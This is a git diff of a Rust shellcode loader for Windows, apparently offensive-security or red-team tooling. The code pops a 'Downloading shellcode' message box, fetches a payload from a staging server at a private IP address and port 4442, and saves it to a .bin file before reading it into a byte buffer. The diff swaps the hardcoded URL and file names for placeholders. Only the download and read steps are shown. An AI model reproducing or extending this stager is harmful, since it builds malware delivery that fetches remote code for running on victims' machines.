@@ -34,7 +34,7 @@ fn download() -> Result<File, Box<dyn std::error::Error>> // Return a nothing on
 {
     unsafe{MessageBoxA(None, s!("Downloading shellcode"), s!("Info"), MB_OK)}; // Show a message box to indicate that the download is starting.
     // Use reqwest to download to get the shell code
-    let mut _url_grab = match blocking::get("http://192.168.174.128:4442/client_report/client_id?=25084")
+    let mut _url_grab = match blocking::get("URL")
     {
         Ok(response) => response, // If the request was successful, return the response
         Err(e) => {
@@ -43,7 +43,7 @@ fn download() -> Result<File, Box<dyn std::error::Error>> // Return a nothing on
     };
 
     // Create a file to save the shellcode to
-    let mut _path = File::create("client_25084.bin")?;
+    let mut _path = File::create("file")?;
 
     io::copy(&mut _url_grab, &mut _path); // Copy the contents of the url to the file. The ? operator will return an error if it occurs, othewise it will continue.
     
@@ -57,7 +57,7 @@ fn bin_to_byte(_file: File) -> Result<Vec<u8>, Box<dyn std::error::Error>> { // 
     let _file = OpenOptions::new()
         .read(true)
         .write(true)
-        .open("client_25084.bin")?; // Open the file for reading. The ? operator will return an error if it occurs, otherwise it will continue.   
+        .open("file")?; // Open the file for reading. The ? operator will return an error if it occurs, otherwise it will continue.   
    
     // create a buffer to hold the contents. This is a vector of 8 bit unsigned integers, which is the same as a byte array. The buffer will be filled with the contents of the file.
     let mut buffer = Vec::new();
